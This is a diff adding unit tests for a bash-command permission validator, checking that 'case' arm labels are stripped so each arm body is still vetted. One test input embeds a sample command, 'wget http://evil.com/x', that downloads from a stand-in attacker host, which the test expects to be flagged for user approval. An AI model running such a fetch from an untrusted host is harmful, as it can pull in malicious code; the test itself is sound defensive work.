@@ -666,6 +666,49 @@ class TestNoopBuiltins(unittest.TestCase):
         self.assertEqual(result["decision"], "ask")
 
 
+class TestCaseArmPatternLabels(unittest.TestCase):
+    """The parser splits a `case` body on `;;`, so each arm's body comes through
+    glued to its `pattern)` label (e.g. `*) echo "$kv"`). The leading label is
+    peeled so the arm body is validated on its own merits."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_reduce_unit(self):
+        cases = {
+            '*) echo hi': "echo hi",        # catch-all arm
+            'foo) echo hi': "echo hi",      # literal pattern arm
+            '*.gd) echo hi': "echo hi",     # glob pattern arm
+            '*)': "",                        # empty arm (pattern only)
+            'echo hi': "echo hi",            # no label, unchanged
+            '(cd app': "(cd app",            # subshell fragment left for strip
+            # `case ... in` header + first arm's pattern peeled, exposing body
+            'case "$x" in foo) echo hi': "echo hi",
+            'case "$x" in *) wget evil': "wget evil",
+            'case "$x" in *=0': "",          # empty first arm (`)` stripped) -> no-op
+            'case "$x"': "",                 # header split across segments (no `in`)
+        }
+        for cmd, expected in cases.items():
+            self.assertEqual(
+                self.validator._reduce_to_effective_command(cmd), expected,
+                f"reduce({cmd!r})")
+
+    def test_case_statement_allowed(self):
+        """A full `case` over allowlisted arm bodies auto-approves."""
+        result = self.validator.validate_bash_command(
+            'for kv in $out; do case "$kv" in *=0) ;; *) echo "  $kv";; esac; done')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_case_arm_body_still_validated(self):
+        """Peeling the `pattern)` label must not hide a non-allowlisted body."""
+        result = self.validator.validate_bash_command(
+            'case "$x" in *) wget http://evil.com/x;; esac')
+        self.assertEqual(result["decision"], "ask")
+
+
 class TestAskReasonNamesUnknownCommands(unittest.TestCase):
     """The prompt shown to the user names the specific non-allowlisted
     sub-commands instead of a generic 'unknown or empty' string."""
